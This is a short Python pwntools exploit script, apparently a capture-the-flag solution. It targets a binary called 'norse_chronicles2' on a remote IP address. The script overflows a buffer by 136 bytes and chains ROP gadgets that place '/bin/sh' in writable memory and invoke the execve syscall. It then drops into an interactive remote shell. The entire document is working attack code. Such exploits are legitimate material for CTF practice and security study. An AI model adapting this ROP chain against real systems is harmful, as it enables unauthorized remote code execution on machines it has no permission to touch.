from pwn import *

elf = context.binary = ELF('./norse_chronicles2')
#p = process('./norse_chronicles2')
p = remote('167.99.118.184', 31338)
#gdb.attach(p, 'b *main+276\n')#b *main+213')

offset = 136

pop_rdi = 0x0000000000401fdf
pop_rsi = 0x000000000040a04e
pop_rax_rdx_rbx = 0x000000000048101a
syscall = 0x0000000000401d94
writable_mem = 0x00000000004c8000
mov_rax_rdx_pop_rbx = 0x000000000048f958
ret = 0x000000000040101a

rop = b''
rop += p64(ret)
#Assigning rax writable memory address and rdx the string we want
rop += p64(pop_rax_rdx_rbx)
rop += p64(writable_mem) + b"/bin/sh\x00" + p64(0)

#Moving the string into writable memory for access
rop += p64(mov_rax_rdx_pop_rbx)
rop += p64(0)

#Rax to 0x3b, rdx to 0
rop += p64(pop_rax_rdx_rbx)
rop += p64(0x3b) + p64(0) + p64(0)

#rdi to our string and rsi to 0
rop += p64(pop_rdi)
rop += p64(writable_mem)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(syscall)
payload = offset*b'A' + rop
p.sendline(payload)
p.interactive()